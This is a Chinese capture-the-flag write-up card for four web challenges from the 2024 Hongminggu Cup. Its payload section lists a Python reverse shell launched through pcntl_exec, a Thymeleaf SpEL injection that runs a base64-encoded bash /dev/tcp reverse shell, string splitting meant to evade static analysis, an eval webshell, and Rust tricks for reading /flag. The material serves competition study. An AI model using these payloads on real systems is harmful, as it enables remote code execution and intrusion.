---
title: "第四届红明谷杯卫星应用数据安全大赛 WEB writeup"
category: web
tags: ["红明谷杯", "web", "Web-PHP-Filter链", "oracle文件读取", "匿名类anonymous", "pcntl_exec绕disable_function"]
signals: ["红明谷杯 2024", "Web-PHP-Filter链", "oracle文件读取", "匿名类anonymous", "pcntl_exec绕disable_function", "Rust-std过滤+include!+FFI", "Rust内联externC", "SpringBoot-ThymeleafSSTI", "Log4j-LoaderUtil", "ssrf", "WEB", "PHP-Filter", "oracle", "synacktiv"]
difficulty: hard
source: "https://www.ctfiot.com/173339.html"
tools: ["C", "PHP", "Python", "Rust", "Spring", "curl"]
origin: des-import
origin_kind: cards
updated: 2026-10-24
---
# 第四届红明谷杯卫星应用数据安全大赛 WEB writeup

> 赛事：红明谷杯 2024 | 方向：web | 难度：hard | 工具：C、PHP、Python、Rust、Spring、curl

## 一句话总结

第四届红明谷杯卫星应用WEB 4题:PHP-Filter链oracle读源(synacktiv工具)+匿名类anonymous\0/var/www/html/flag.php:7$0+pcntl_exec反弹shell+Rust-std过滤用include!("/flag")或extern C system+Spring Boot/curl SSRF跳板/Log4j LoaderUtil调SpelExpressionParser反弹

## 攻击链

1. PHP-Filter链: synacktiv/php_filter_chains_oracle_exploit工具跑出flag.php|匿名类: ?ezphpPhp8=class@anonymous\0/var/www/html/flag.php:7$0 调getflag|disable_function: Basic Auth admin/2e525e29e465f45d8d7c56319fe73036+@eval($_GET[''cmd''])+pcntl_exec python反弹|Rust: 过滤std→include!("/flag")或extern "C" fn system+unsafe{Spring Boot curl+getsites: SSRF/curl下载vps+hostname SpelExpressionParser+Log4j LoaderUtil调Runtime.exec反弹

## 关键 payload

```
?ezphpPhp8=class@anonymous%00/var/www/html/flag.php:7$0|pcntl_exec("/usr/bin/python",array(''-c'',''import socket,subprocess,os;s=socket.socket(...);s.connect(...);os.dup2(s.fileno(),0,1,2);p=subprocess.call(["/bin/bash","-i"])''))|fn main() { include!("/flag"); }|extern "C" { fn system(cmd: *const u8) -> i32; } unsafe { system("cat /flag".as_ptr()); }|T(org.thymeleaf.util.ClassLoaderUtils).loadClass(''org.apa''+''che.logging.log4j.util.LoaderUtil'').newInstanceOf(''org.spr''+''ingframework.expression.spel.standard.SpelExpressionParser'').parseExpression(''T(java.lang.Runtime).getRuntime().exec("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8wLjAuMC4wLzk5OTkgMD4mMQ==}|{base64,-d}|{bash,-i}")'').getValue()
```

## 经验教训

1) PHP-Filter链 oracle攻击:synacktiv工具可基于错误状态oracle盲读任意文件; 2) PHP匿名类引用:`class@anonymous\0/path/file.php:line$idx`; 3) disable_function绕:pcntl_exec调python反弹shell (subprocess+os.dup2); 4) Rust std过滤:include!("/flag") 或 FFI extern "C" unsafe { system(...) }; 5) Spring Boot Thymeleaf SpEL RCE:`[[${T(...).parseExpression('T(java.lang.Runtime).getRuntime().exec(...)').getValue()}]]`; 6) Java外部类字符串拼接:'org.apa'+'che.logging.log4j.util.LoaderUtil' 绕静态分析; 7) curl+SSRF跳板:public vps→/curl?url→hostname 跳本地127.0.0.1

## 标签

Web-PHP-Filter链、oracle文件读取、匿名类anonymous、pcntl_exec绕disable_function、Rust-std过滤+include!+FFI、Rust内联externC、SpringBoot-ThymeleafSSTI、Log4j-LoaderUtil、SSRF/curl+跳板、Java外部类

## 参考来源

- https://www.ctfiot.com/173339.html
- 原文件：第四届红明谷杯卫星应用数据安全大赛_WEB_writeup.full.md
